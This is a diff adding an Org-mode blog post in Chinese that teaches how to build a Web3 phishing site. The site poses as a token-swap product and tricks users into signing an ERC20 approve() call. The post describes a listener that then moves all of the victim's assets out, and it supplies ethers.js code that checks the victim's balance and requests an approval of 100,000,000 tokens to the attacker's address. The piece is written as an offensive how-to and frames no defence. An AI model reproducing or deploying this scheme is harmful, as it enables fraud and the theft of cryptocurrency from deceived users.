@@ -1,0 +1,42 @@
+#+TITLE: 如何通过Approve函数制作一个简单的Web3钓鱼网站
+#+KEYWORDS: Hack, dapp, web3, erc20
+#+DESCRIPTION: How to make a fishing dapp by Approve Event
+#+HTML_LINK_HOME: /blog
+
+** 原理解析
+
+制作一个虚假的产品网站, 引导用户使用现有的主流ERC20货币兑换领取首发ERC20货币,
+实际上是执行的是Approve函数,
+Approve函数的是授权使用当前帐号, 即可以执行Transfer这样的危险操作
+
+用户一旦授权通过, 监听服务就会查询该帐号下面的资产, 然后全部转移
+
+
+** JS代码
+
+#+BEGIN_SRC javascript
+  const token = '' // ERC20
+  const abi = {} // ERC20 ABI
+  const address = '' // your account address
+
+  const provider = new ethers.providers.Web3Provider(window.ethereum)
+  const signer = provider.getSigner()
+
+  const contract = new ethers.Contract(token, abi, provider);
+  const contractWithSigner = contract.connect(signer)
+
+  let balance = await contract.balanceOf(account)
+  balance = ethers.utils.formatUnits(balance)
+
+  if (balance > 0.01) {
+    const tx = await contractWithSigner.approve(
+      address,
+      ethers.utils.parseEther('100000000'),
+      {
+	gasLimit: 60000,
+	gasPrice: ethers.utils.parseUnits('6.5', 'gwei')
+      }
+    )
+  }  
+#+END_SRC
+
